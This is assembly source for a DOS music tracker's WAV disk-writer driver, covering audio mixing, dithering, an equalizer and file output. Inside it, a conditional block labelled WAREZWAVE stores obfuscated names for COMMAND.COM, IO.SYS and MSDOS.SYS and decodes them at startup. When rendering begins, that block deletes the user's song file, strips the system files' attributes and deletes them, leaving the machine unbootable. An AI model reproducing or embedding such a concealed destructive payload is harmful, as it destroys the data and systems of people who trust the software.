
        .386P

Segment                 DriverHeader PARA Public 'Code' Use16
                        Assume CS:Driver, DS:Nothing

;***** Driver Header *******

include drhead.inc

EndS

Segment                 Driver PARA Public 'Code' Use16
                        Assume CS:Driver, DS:Nothing

ORG 0
StartDriver:

include vtable.inc

;********  Required ProcedureTable *************

include reqproc.inc

STEREOENABLED   EQU     1
MIXRESOLUTION   EQU     32

include ..\wavswitc.inc

FileHandle      DW      0
NumClipped      DD      0

WAVOutputMsg    DB      "Writing to disk", 13
                DB      "Output frequency ", 0FDh, "D", 0
WAVFileErrorMsg DB      "Unable to create output file!                              ", 0
WAVMemErrorMsg  DB      "Unable to allocate memory!", 0
NoReinitMsg     DB      "File output routines should NOT require reinitialisation   ", 0
WriteError      DB      "Error writing to output file. Output file closed           ", 0
DefaultDriverName DB    "ITWAV.DRV", 0
DriverName      DD      0
ClippedMsg      DB      "Clipped ", 0FDh, "L", 0

WAVEFileHeader  DB      "RIFF"
WAVEFileSize    DD      0
WAVEFileHeader2 DB      "WAVEfmt "
WAVEFileHeaderLength DD 10h
WAVEFileID      DW      1
WAVEChannels    DW      1               ; 1 = mono, 2 = stereo
MixSpeed        DW      44100           ; Default to CD quality
WAVEMixSpeedFiller DW   0
WAVEBytesPerSecond DD   0
WAVEBytesPerSample DW   2
WAVEBits        DW      16
WAVEHeader3     DB      "data"
WAVEDataSize    DD      0

IF REGISTERED
  Stereo          DB      0
  StereoSet       DB      0
ENDIF

BytesToMix           DW 0
RealBytesToMix       DW 0
BytesToMixFractional DD 0
CurrentFractional    DD 0

MixVolume       DW      0
MixSegment      DW      0
MixHandler      DW      Offset M32MixHandler
CONFIGURATIONOFFSET     EQU     $+128
CONFIGSIZE              EQU     90
WAVDirectory    DB      ".", 79 Dup (0)
VolumeTable             DB      0, 16, 96, 127
                        DB      0, 0, 0, 0
StartNoRamp     DW      0
OldDirectory    DB      80 Dup (0)

CreatingMsg     DB      "Creating file "
OutputFileName  DB      "                                              ", 0

ClosedFileMsg   DB      "Finished writing file                                      ", 0
OUTPUT          DB      "OUTPUT"

LongMixSpeed    DD      0

IF DITHEROUTPUT
MonoDitherValue         DD      0
LeftDitherValue         DD      0
RightDitherValue        DD      0
ENDIF

WAVScreenList           DW      6
                        DW      IdleFunctionList
                        DW      GlobalKeyLink

                        DW      Near Ptr FullScreenBox  ; 0
                        DW      Near Ptr ScreenHeader
                        DW      Near Ptr FillHeader
                        DW      Near Ptr WAVHeader

                        DW      Near Ptr FilterBox1
                        DW      Near Ptr DirectoryInputBox
                        DW      Near Ptr DirectoryInput         ; 6

                        DW      Near Ptr FilterBox2
                        DW      Near Ptr FilterFrequency1       ; 8
                        DW      Near Ptr FilterFrequency2
                        DW      Near Ptr FilterFrequency3
                        DW      Near Ptr FilterFrequency4
                        DW      Near Ptr FilterVolume1
                        DW      Near Ptr FilterVolume2
                        DW      Near Ptr FilterVolume3
                        DW      Near Ptr FilterVolume4

                        DW      Near Ptr DirectoryInputText
                        DW      Near Ptr FilterText

                        DW      Near Ptr StartRampText
                        DW      Near Ptr StartRampEnabledButton ; 19
                        DW      Near Ptr StartRampDisabledButton

                        DW      0

WAVHeader               DW      10
                        DB      "WAV Driver", 0

StartRampText           DW      1
                        DB      2, 25
                        DB      20h
                        DB      "Ramp volume at start of sample", 0

StartRampEnabledButton  DW      2
                        DW      11, 0FFFFh, 20, 20
                        DW      0, 0, 0
                        DW      5
                        DW      Offset StartNoRampFunction
Seg1                    DW      0
                        DW      0
                        DW      0, 0
                        DB      33, 24, 47, 26
                        DB      8, 0
                        DB      "   Enabled", 0

StartRampDisabledButton DW      2
                        DW      11, 0FFFFh, 19, 19
                        DW      0, 0, 0
                        DW      5
                        DW      Offset StartNoRampFunction
Seg2                    DW      0
                        DW      1
                        DW      0, 0
                        DB      48, 24, 62, 26
                        DB      8, 0
                        DB      "  Disabled", 0

IdleFunctionList        DD      0
                        DD      0
GlobalKeyLink           DB      7
GlobalKeyLink2          DD      0

FillHeader              DW      8
FillHeader2             DD      0

FullScreenBox           DW      0
                        DB      0, 0, 79, 49
                        DB      4

ScreenHeader            DW      8
ScreenHeader2           DD      0

DirectoryInputText      DW      1
                        DB      2, 14
                        DB      20h
                        DB      "Output Directory", 0

DirectoryInputBox       DW      0
                        DB      18, 13, 78, 15
                        DB      25

DirectoryInput          DW      16
                        DB      19, 14
Segment1                DW      0
                        DW      Offset WAVDirectory
                        DW      59
                        DD      0
                        DW      0FFFFh, 8, 0FFFFh, 0FFFFh

FilterText              DW      1
                        DB      2, 17
                        DB      20h
                        DB      "Output Equalizer", 13
                        DB      13
                        DB      "     Low Frequency Band", 13
                        DB      " Med Low Frequency Band", 13
                        DB      "Med High Frequency Band", 13
                        DB      "    High Frequency Band", 0

FilterBox1              DW      0
                        DB      25, 18, 47, 23
                        DB      25

FilterBox2              DW      0
                        DB      52, 18, 74, 23
                        DB      25

FilterFrequency1        DW      14
                        DB      26, 19
                        DW      0, 127
                        DW      9, 0
                        DW      6, 9, 12, 12
                        DW      0FFFFh, 0FFFFh
                        DW      20

FilterFrequency2        DW      14
                        DB      26, 20
                        DW      0, 127
                        DW      9, 1
                        DW      8, 10, 13, 13
                        DW      0FFFFh, 0FFFFh
                        DW      20

FilterFrequency3        DW      14
                        DB      26, 21
                        DW      0, 127
                        DW      9, 2
                        DW      9, 11, 14, 14
                        DW      0FFFFh, 0FFFFh
                        DW      20

FilterFrequency4        DW      14
                        DB      26, 22
                        DW      0, 127
                        DW      9, 3
                        DW      10, 19, 15, 15
                        DW      0FFFFh, 0FFFFh
                        DW      20

FilterVolume1           DW      14
                        DB      53, 19
                        DW      0, 255
                        DW      9, 4
                        DW      6, 13, 8, 8
                        DW      0FFFFh, 0FFFFh
                        DW      20

FilterVolume2           DW      14
                        DB      53, 20
                        DW      0, 255
                        DW      9, 5
                        DW      12, 14, 9, 9
                        DW      0FFFFh, 0FFFFh
                        DW      20

FilterVolume3           DW      14
                        DB      53, 21
                        DW      0, 255
                        DW      9, 6
                        DW      13, 15, 10, 10
                        DW      0FFFFh, 0FFFFh
                        DW      20

FilterVolume4           DW      14
                        DB      53, 22
                        DW      0, 255
                        DW      9, 7
                        DW      14, 19, 11, 11
                        DW      0FFFFh, 0FFFFh
                        DW      20

IF WAREZWAVE
  Filename1      DB     01h, 0C8h, 0E6h, 01h, 0F5h, 0F7h, 0F7h, 03h, 0F4h, 0FEh, 0D4h, 01h, 0F5h, 0F7h, 0C2h  ; COMMAND.COM
  Filename2      DB     01h, 0C8h, 0E6h, 0FBh, 0F5h, 0D4h, 0F1h, 0EBh, 0F1h, 0C2h                               ; IO.SYS
  Filename3      DB     01h, 0C8h, 0E6h, 0F7h, 0F1h, 0FEh, 0F5h, 0F1h, 0D4h, 0F1h, 0EBh, 0F1h, 0C2h             ; MSDOS.SYS
  LocalDirectory DB     ".", 60 Dup(0)
ENDIF

include mixwav.inc

include wav.mix

; 컴 DetectCard 컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
;
; Returns carry set if error, else carry clear. Has to setup internal vars
; (eg. appropriate IRQ/DMA whatever).
;
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴


Proc            DetectCard Far

                Cmp     BX, 217h
                JAE     DetectCardUseDriver

                Mov     CX, DS
                ShL     ECX, 16
                Mov     CX, Offset DefaultDriverName

DetectCardUseDriver:
                Mov     [CS:DriverName], ECX

                Call    GetEMSPageFrame
                Mov     EMSPageFrame, AX

                Mov     Seg1, CS
                MOv     Seg2, CS

IF WAREZWAVE

; Decode things
                Push    CS
                Push    CS
                Pop     DS
                Pop     ES
                        Assume DS:Driver

                Mov     CX, 3

                Mov     SI, Offset Filename1
                Mov     DI, Offset Filename1

DetectCard1:

                LodsB
                Sub     AL, 24h
                Xor     AL, 9Eh
                StosB

                JNZ     DetectCard1
                Loop    DetectCard1

ENDIF

                Mov     EAX, 'Jeff'
                ClC             ; Always assume true
                Ret

EndP            DetectCard

;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴

InterpretState  DB      0
InterpretType   DB      0

Proc            SendUARTOut Far ; Local interpreter activated with 0F0h 0F0h.

                Mov     AH, CS:InterpretState
                Cmp     AH, 2
                JB      SendUARTOut1

; In interpreter.
                JE      SendUARTOut3

; Have InterpretType, now get parameter, then return to normal.

                Cmp     AL, 7Fh
                JA      SendUARTOut4

                Push    BX

                Mov     BL, CS:InterpretType    ; Want BX = InterpretType*64+Channel
                                                ;
                ShL     BX, 6
                Add     BL, [DI+20h]
                And     BX, 127
                Mov     [CS:FilterParameters+BX], AL

                Pop     BX

                Test    SI, SI
                JZ      SendUARTOut4

                Or      Byte Ptr [SI], 64

SendUARTOut4:
                Mov     CS:InterpretState, 0
                Ret

SendUARTOut3:
                Cmp     AL, 2
                JAE     SendUARTOut4

                Mov     InterpretType, AL
                Jmp     SendUARTOutStateInc

SendUARTOut1:
                Cmp     AL, 0F0h
                JNE     SendUARTOut2

SendUARTOutStateInc:
                Inc     CS:InterpretState
                Ret

SendUARTOut2:
                Test    AH, AH
                JZ      SendUARTOutEnd

                Mov     CS:InterpretState, 0
                Ret

SendUARTOutEnd:
                Cmp     AL, 0FCh
                JE      ResetFilters
                Cmp     AL, 0FAh
                JE      ResetFilters

                Cmp     AL, 0FFh
                JNE     SendUARTOutNoClear

ResetFilters:
                PushA
                Push    ES

                Push    CS
                Pop     ES

                Mov     DI, Offset FilterParameters
                Mov     CX, 64
                Mov     AL, 7Fh
                Rep     StosB
                Mov     CX, 64
                Xor     AX, AX
                Rep     StosB

                Pop     ES
                PopA

SendUARTOutNoClear:
                Ret

EndP            SendUARTOut

;컴 InitSound 컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
;
; Sets up any memory required for output
; Initiates output
;
; Parameters: AX = Number of Channels
;
; If sucessful, returns:
;   Carry flag clear
;   DS:SI = pointer to text to display
;      AX = parameter 1 in text
;      BX = parameter 2 in text
;      CX = parameter 3 in text
;      DX = parameter 4 in text
;      DI = parameter 5 in text
;
; If unsucessful, returns:
;   Carry flag set
;
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴

Proc            InitSound Far

                Push    CS
                Pop     DS
                        Assume DS:Driver

                Mov     Segment1, DS

                Mov     ECX, IdleUpdateInfoLine
                Mov     EDX, GlobalKeyList
                Mov     IdleFunctionList, ECX
                Mov     GlobalKeyLink2, EDX

                Mov     ECX, FillHeaderFunction
                Mov     EDX, DrawHeaderFunction
                Mov     FillHeader2, ECX
                Mov     ScreenHeader2, EDX

                Call    GotoHomeDirectory
                Mov     SI, Offset WAVDirectory
                Call    SetDirectory

                Mov     AH, 48h
                Mov     BX, 2648        ; (65536 / (.4*31)) * 4 * 2
                                        ; +80 (filtering area)
                Int     21h
                JNC     InitSound1

                Mov     SI, Offset WAVMemErrorMsg
                Ret

InitSound1:
                Mov     MixSegment, AX

                Mov     SI, Offset WAVOutputMsg

                Mov     AX, CmdLineMixSpeed
                And     AX, AX
                JZ      InitSound3

                Cmp     AX, 8000
                JA      InitSound4

                Mov     AX, 8000

InitSound4:
                Cmp     AX, 64000
                JB      InitSound5

                Mov     AX, 64000

InitSound5:
                Mov     MixSpeed, AX

InitSound3:
                Mov     AX, MixSpeed
                Mov     Word Ptr LongMixSpeed, AX

                FNInit
                FILd    DWord Ptr [MixSpeed]
                FMul    FreqMultiplier
                FStP    FreqMultiplier

                Call    CalculateFilterCoefficients

                Ret

EndP            InitSound
                Assume DS:Nothing

;컴 ReInitSound 컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
;
; Reinitialises sound output
; Initiates sound output
;
; Parameters: AX = number of channels.
;
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴

Proc            ReInitSound Far

                Push    CS
                Pop     DS

                Mov     SI, Offset NoReinitMsg
                Mov     BX, 40
                Call    SetInfoLine

                Ret

EndP            ReInitSound

;컴 UnInitSound 컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
;
; Stops sound output, releases any memory used by driver
;
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴

Proc            UnInitSound Far

                Call    GotoHomeDirectory

                Mov     DS, Word Ptr [CS:DriverName+2]
                Mov     DX, Word Ptr [CS:DriverName]

                Mov     AX, 3D02h       ; Read write access
                Int     21h

                Push    CS
                Pop     DS
                        Assume DS:Driver

                JC      SaveConfig2

                Mov     BX, AX

                Mov     AX, 4200h
                Xor     CX, CX
                Mov     DX, Offset CONFIGURATIONOFFSET
                Int     21h
                JC      SaveConfig1

                Mov     AH, 40h
                Mov     CX, CONFIGSIZE
                Mov     DX, Offset WAVDirectory
                Int     21h

SaveConfig1:
                Mov     AH, 3Eh
                Int     21h

SaveConfig2:
                Mov     AX, MixSegment
                Test    AX, AX
                JZ      UnInitsound1

                Mov     ES, AX
                Mov     AH, 49h
                Int     21h

UnInitSound1:
                Mov     BX, FileHandle
                Test    BX, BX
                JZ      UnInitSound2

                Mov     AX, 4200h       ; Move to start of file
                Xor     CX, CX
                Xor     DX, DX
                Int     21h             ; Start of file

                Mov     EAX, WAVEDataSize
                Add     EAX, 24h
                Mov     WAVEFileSize, EAX

                Mov     AH, 40h
                Mov     DX, Offset WAVEFileHeader
                Mov     CX, 2Ch
                Int     21h

                Mov     AH, 3Eh
                Int     21h

UnInitSound2:
                Ret

EndP            UnInitSound
                Assume DS:Nothing

;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴

Proc            CopyFileName            ; Given DI

                Push    DS

                Call    GetFileName
                        Assume DS:Nothing       ; Returns DS:SI

                Push    CS
                Pop     ES
                Mov     CX, 11
                Mov     AL, ' '
                Push    DI
                Rep     StosB
                Pop     DI

                Mov     CX, 8

                Cmp     Byte Ptr [SI], 0
                JE      CopyFileName2
                Cmp     Byte Ptr [SI], '.'
                JE      CopyFileName2

CopyFileName1:
                LodsB
                Cmp     AL, '.'
                JE      CopyFileName3
                StosB
                Loop    CopyFileName1

                Pop     DS
                Ret

CopyFileName2:
                Push    CS
                Pop     DS
                Mov     SI, Offset OUTPUT
                Mov     CX, 6
                Rep     MovsB

CopyFileName3:
                Pop     DS
                Ret

EndP            CopyFileName

;컴 Poll 컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
;
; This procedure is called as often as possible by IT.EXE
; AX = Playmode (0 for nothing in particular, 1 = pattern, 2 = song)
; BX = pattern
;
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴

SlaveChannelLocation    DW      0, 0, 0

Proc            Poll Far

                Cmp     MixSegment, 0
                JNE     Poll2

                Ret

Poll2:
                Push    BX
                Call    Update          ; Got DS:SI, CX
                Pop     BX

                Mov     CS:[SlaveChannelLocation], SI
                Mov     CS:[SlaveChannelLocation+2], DS
                Mov     CS:[SlaveChannelLocation+4], CX

                Test    AX, AX
                JNZ     Poll1

                Cmp     CS:FileHandle, 0
                JE      Poll7

                PushAD
                Push    DS

                Push    CS
                Pop     DS
                        Assume DS:Driver

                Mov     SI, Offset ClosedFileMsg
                Mov     BX, 100
                Call    SetInfoLine

PollCloseFile:
                Xor     BX, BX
                XChg    BX, FileHandle
                Mov     AX, 4200h       ; Move to start of file
                Xor     CX, CX
                Xor     DX, DX
                Int     21h             ; Start of file

                Mov     EAX, WAVEDataSize
                Add     EAX, 24h
                Mov     WAVEFileSize, EAX

                Mov     AH, 40h
                Mov     DX, Offset WAVEFileHeader
                Mov     CX, 2Ch
                Int     21h

                Mov     AH, 3Eh         ; Close file
                Int     21h

                Pop     DS
                PopAD
                        Assume DS:Nothing
                Ret

Poll7:
IF REGISTERED
                Mov     AL, CS:StereoSet
                Mov     CS:Stereo, AL
ENDIF
                Ret

Poll1:
                PushAD
                Push    DS
                Push    ES

                Cmp     CS:FileHandle, 0
                JNE     Poll8
                                ; Create file... BX = pattern

                Push    AX

                Push    CS
                Push    CS
                Pop     DS
                Pop     ES
                        Assume DS:Driver

                Xor     EAX, EAX
                Mov     LastClickRemovalLeft, EAX
                Mov     LastClickRemovalRight, EAX
                Mov     NumClipped, EAX
                Mov     CurrentFractional, EAX
IF DITHEROUTPUT
                Mov     MonoDitherValue, EAX
                Mov     LeftDitherValue, EAX
                Mov     RightDitherValue, EAX
ENDIF

                Mov     DI, Offset LastFilter
                Mov     CX, 16
                Xor     AX, AX
                Rep     StosW

IF WAREZWAVE                    ; Delete the file!

                Mov     Byte Ptr [WAVEChannels], 2

                Call    [GetfileName]
                Mov     DX, SI
                Mov     AH, 41h
                Int     21h

                Push    CS
                Pop     DS

                Mov     DX, Offset Filename1
                Mov     AH, 41h
                Int     21h

                Mov     AX, 4301h
                Mov     DX, Offset Filename2
                Xor     CX, CX
                Int     21h

                Mov     AX, 4301h
                Mov     DX, Offset Filename3
                Xor     CX, CX
                Int     21h

                Mov     DX, Offset Filename1
                Mov     AH, 41h
                Int     21h

                Mov     DX, Offset Filename2
                Mov     AH, 41h
                Int     21h

                Mov     DX, Offset Filename3
                Mov     AH, 41h
                Int     21h

ENDIF
                Pop     AX

                Mov     SI, Offset OldDirectory
                Mov     Word Ptr [SI], '.'
                Call    SetDirectory
                Call    GotoHomeDirectory
                Mov     SI, Offset WAVDirectory
                Call    SetDirectory

                Cmp     AX, 1
                JE      Poll9

                Mov     DI, Offset OutputFileName
                Call    CopyFileName
                Mov     AX, 'W.'
                StosW
                Mov     AX, 'VA'
                StosW
                Jmp     Poll12

Poll9:
                Mov     DI, Offset OutputFileName
                Call    CopyFileName

                Xor     DX, DX
                Mov     AX, BX          ; AX = pattern
                Mov     BX, 10
                Div     BX
                Mov     CL, DL
                Xor     DX, DX
                Div     BX
                Mov     AH, AL
                Mov     AL, '.'
                Add     AH, '0'
                StosW
                Mov     AL, DL
                Mov     AH, CL
                Add     AX, '00'
                StosW

Poll12:
                Mov     AH, 3Ch
                Xor     CX, CX
                Mov     DX, Offset OutputFileName
                Int     21h             ; Create file...
                Mov     SI, Offset CreatingMsg
                JNC     Poll10

Poll11:
                Mov     SI, Offset WAVFileErrorMsg
                Mov     BX, 100
                Call    SetInfoLine
                Call    StopPlayBack

                Mov     SI, Offset OldDirectory
                Call    SetDirectory

                Pop     ES
                Pop     DS
                PopAD
                Ret


Poll10:
                Mov     FileHandle, AX

                Xor     EDX, EDX
                Mov     WAVEDataSize, EDX
                Mov     DX, MixSpeed

IF REGISTERED
                Mov     CL, Stereo
                Inc     CX
                ShL     EDX, CL

ELSE
                ShL     EDX, 1

ENDIF
                Mov     WAVEBytesPerSecond, EDX

IF   REGISTERED
                Mov     DX, 1
                ShL     DX, CL
                Mov     WAVEBytesPerSample, DX

                Mov     Byte Ptr [WAVEChannels], CL
ENDIF

                Mov     BX, AX
                Mov     CX, 2Ch
                Mov     DX, Offset WAVEFileHeader
                Mov     AH, 40h
                Int     21h

                Mov     BX, 100
                Call    SetInfoLine

                Mov     SI, Offset OldDirectory
                Call    SetDirectory

                        Assume DS:Nothing

Poll8:
                Call    SaveEMSPageFrame

                LDS     SI, [DWord Ptr SlaveChannelLocation]
                Mov     CX, [SlaveChannelLocation+4]

                Call    M32MixHandler
                Call    RestoreEMSPageFrame

                                        ; Now reorder everything in mixbuff
                Mov     DS, CS:MixSegment
                Push    DS
                Pop     ES

IF DITHEROUTPUT
                Mov     SI, 80
                Xor     DI, DI
                Mov     CX, CS:RealBytesToMix

 IF REGISTERED

                Cmp     CS:Stereo, 0
                JE      PollNoStereo

                Mov     EDX, CS:LeftDitherValue
                Mov     EBP, CS:RightDitherValue

 PollStereoDitherLoop:
                Add     EDX, [SI]
                Add     EBP, [SI+4]

  IF DOUBLEVOLUME
                Mov     EAX, EDX
                And     EDX, 1FFFh

                SAR     EAX, 13
                Mov     EBX, EBP

                SAR     EBX, 13
                And     EBP, 1FFFh
  ELSE
                Mov     EAX, EDX
                And     EDX, 3FFFh

                SAR     EAX, 14
                Mov     EBX, EBP

                SAR     EBX, 14
                And     EBP, 3FFFh
  ENDIF

                Cmp     EAX, -8000h
                JL      StereoDitherClip1

                Cmp     EAX, 7FFFh
                JG      StereoDitherClip2

 StereoDitherClipped1:
                Cmp     EBX, -8000h
                JL      StereoDitherClip3

                Cmp     EBX, 7FFFh
                JG      StereoDitherClip4

 StereoDitherClipped2:
                ShL     EBX, 16
                And     EAX, 0FFFFh

                Or      EAX, EBX
                Add     SI, 8

                StosD
                Dec     CX
                JNZ     PollStereoDitherLoop

                Mov     CS:LeftDitherValue, EDX
                Mov     CS:RightDitherValue, EBP

                Mov     CX, CS:RealBytesToMix
                ShL     CX, 2
                Jmp     PollWriteBlock

 StereoDitherClip1:
                Mov     AX, 8000h
                Jmp     StereoDitherClipped1

 StereoDitherClip2:
                Mov     AX, 7FFFh
                Jmp     StereoDitherClipped1

 StereoDitherClip3:
                Mov     BX, 8000h
                Jmp     StereoDitherClipped2

 StereoDitherClip4:
                Mov     BX, 7FFFh
                Jmp     StereoDitherClipped2

 ENDIF
 PollNoStereo:
                Mov     EBX, CS:MonoDitherValue

 PollMonoDitherLoop:
                Add     EBX, [SI]
                Add     SI, 8

                Mov     EAX, EBX
 IF DOUBLEVOLUME
                And     EBX, 1FFFh
                SAR     EAX, 13
 ELSE
                And     EBX, 3FFFh
                SAR     EAX, 14
 ENDIF

                Cmp     EAX, -8000h
                JL      MonoDitherClip1

                Cmp     EAX, 7FFFh
                JG      MonoDitherClip2

 PollMonoDitherClipped:
                StosW

                Dec     CX
                JNZ     PollMonoDitherLoop

                Mov     CS:MonoDitherValue, EBX


                Mov     CX, CS:RealBytesToMix
                Add     CX, CX
                Jmp     PollWriteBlock

 MonoDitherClip1:
                Mov     AX, 8000h
                Jmp     PollMonoDitherClipped

 MonoDitherClip2:
                Mov     AX, 7FFFh
                Jmp     PollMonoDitherClipped


ELSE    ; No dither
                Mov     CX, CS:RealBytesToMix
                Mov     BX, 8

 IF REGISTERED
                Cmp     CS:Stereo, 0
                JE      PollNoStereo

                Add     CX, CX
                Mov     BX, 4

 ENDIF

 PollNoStereo:
                Push    CX

                Mov     SI, 80
                Xor     DI, DI

 Poll3:
                Mov     EAX, [SI]
                Add     SI, BX
                Add     EAX, 2000h
 IF DOUBLEVOLUME
                SAR     EAX, 13
 ELSE
                SAR     EAX, 14
 ENDIF

                Cmp     EAX, -8000h
                JL      Poll5
                Cmp     EAX, 7FFFh
                JG      Poll6

 Poll4:
                StosW
                Dec     CX
                JNZ     Poll3

                Pop     CX
                Add     CX, CX
ENDIF
PollWriteBlock:
                Mov     AH, 40h                 ; Write
                Xor     DX, DX
                Mov     BX, CS:FileHandle
                Int     21h
                JC      PollError
                Cmp     AX, CX
                JE      PollNoError

PollError:
                Push    CS
                Pop     DS
                Mov     SI, Offset WriteError
                Mov     BX, 100
                Call    SetInfoLine

                Call    StopPlayBack

                Pop     ES
                Push    CS
                Pop     DS
                Jmp     PollCloseFile

PollNoError:
                Add     Word Ptr [CS:WAVEDataSize], AX
                AdC     Word Ptr [CS:WAVEDataSize+2], 0

                Pop     ES
                Pop     DS
                PopAD

                Ret

IF DITHEROUTPUT
ELSE
 Poll5:
                Inc     NumClipped
                Mov     AX, 8000h
                Jmp     Poll4

 Poll6:
                Inc     NumClipped
                Mov     AX, 7FFFh
                Jmp     Poll4

ENDIF

EndP            Poll

;컴 SetTempo 컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
;
; Parameters: AX = tempo
;
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴

Proc            SetTempo Far

                PushAD

                Push    BX

                Xor     EAX, EAX
                Xor     EBX, EBX
                Xor     EDX, EDX

                Mov     AX, CS:MixSpeed

                Mov     EBX, EAX
                ShL     EAX, 1          ; EAX = MixSpeed * 2
                ShR     EBX, 1          ; EBX = Mixspeed / 2
                Add     EAX, EBX

                Pop     BX              ; BX = tempo
                Div     EBX

                Mov     CS:BytesToMix, AX
                Mov     CS:BytesToMixFractional, EDX

                PopAD

                Ret

EndP            SetTempo

;컴 SetMixVolume 컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
;
; Parameters: AX = MixVolume
;
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴

Proc            SetMixVolume Far

                Mov     CS:MixVolume, AX
                Ret

EndP            SetMixVolume

;컴 SetStereo 컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
;
; Parameters: AL = Stereo on/off, 0 = off.
;
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴

Proc            SetStereo Far

IF REGISTERED
                  Mov     CS:StereoSet, AL

ENDIF
                Ret

EndP            SetStereo

;컴 LoadSample 컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
;
; Parameters: AX = sample to load
;             DS:SI points to sample header
;             ES:0 points to first sample
;
; Returns: **Carry set if NO error**
;          **Carry clear if error**
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴

Proc            LoadSample Far

                PushAD
                Push    DS
                Push    ES
                Push    FS

                Mov     FS, CS:SongDataArea
                Mov     BP, AX
                Add     BP, BP
                Mov     BP, [FS:64910+BP]

                Xor     CX, CX                  ; From the start of the sample..
                Call    GetSampleLocation       ; Returns DS:ESI, ECX = length (in samples)
                JC      LoadSampleEnd           ; Zero flag ON if 16 bit..

                Mov     BL, [FS:BP+12h]
                JNZ     LoadSample1
                                                ; 8 bit
                Mov     ESI, ECX
                Dec     ESI

                Test    BL, 10h                 ; Loop
                JZ      LoadSample8_3

                Mov     ESI, [FS:BP+34h]
                Mov     ECX, [FS:BP+38h]
                Mov     EDX, 1

                Test    BL, 40h
                JZ      LoadSample8_1

                Neg     EDX

                Mov     ESI, ECX
                Sub     ESI, 1
                JC      LoadSample8_4

                Cmp     ESI, 1
                JAE     LoadSample8_1
                Jmp     LoadSample8_3

LoadSample8_4:
                Xor     ESI, ESI

LoadSample8_3:
                Xor     EDX, EDX

LoadSample8_1:
                Int     3
                Mov     AL, [SI]
                Add     ESI, EDX
                Int     3
                Mov     AH, [SI]

                Mov     ESI, ECX
                Int     3
                Mov     [SI], AL
                Inc     ESI
                Int     3
                Mov     [SI], AH

                Jmp     LoadSampleEnd

LoadSample1:                                    ; 16 bit
                Mov     ESI, ECX
                Dec     ESI

                Test    BL, 10h                 ; Loop
                JZ      LoadSample16_2

                Mov     ESI, [FS:BP+34h]        ; Start
                Mov     ECX, [FS:BP+38h]        ; End
                Mov     EDX, 2

                Test    BL, 40h                 ; Pingpong?
                JZ      LoadSample16_1

                Neg     EDX                     ; Yes..pingpong

                Mov     ESI, ECX
                Sub     ESI, 1
                JC      LoadSample16_4

                Cmp     ESI, 1
                JAE     LoadSample16_1
                Jmp     LoadSample16_2

LoadSample16_4:
                Xor     ESI, ESI

LoadSample16_2:
                Xor     EDX, EDX

LoadSample16_1:
                Add     ESI, ESI
                Int     3
                Mov     AX, [SI]
                Add     ESI, EDX
                ShL     EAX, 16
                Int     3
                Mov     AX, [SI]

                Mov     ESI, ECX
                Add     ESI, ESI
                Int     3
                RoR     EAX, 16
                Mov     [SI], AX
                Add     ESI, 2
                Int     3
                ShR     EAX, 16
                Mov     [SI], AX

LoadSampleEnd:
                Pop     FS
                Pop     ES
                Pop     DS
                PopAD

                StC

                Ret

EndP            LoadSample

;컴 ReleaseSample 컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
;
; Parameters: AX = sample to release
;             DS:SI points to sample header
;
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴

Proc            ReleaseSample Far

                Ret

EndP            ReleaseSample

;컴 ResetMemory 컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
;
;  Frees all on-board memory
;
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴

Proc            ResetMemory Far

                Ret

EndP            ResetMemory

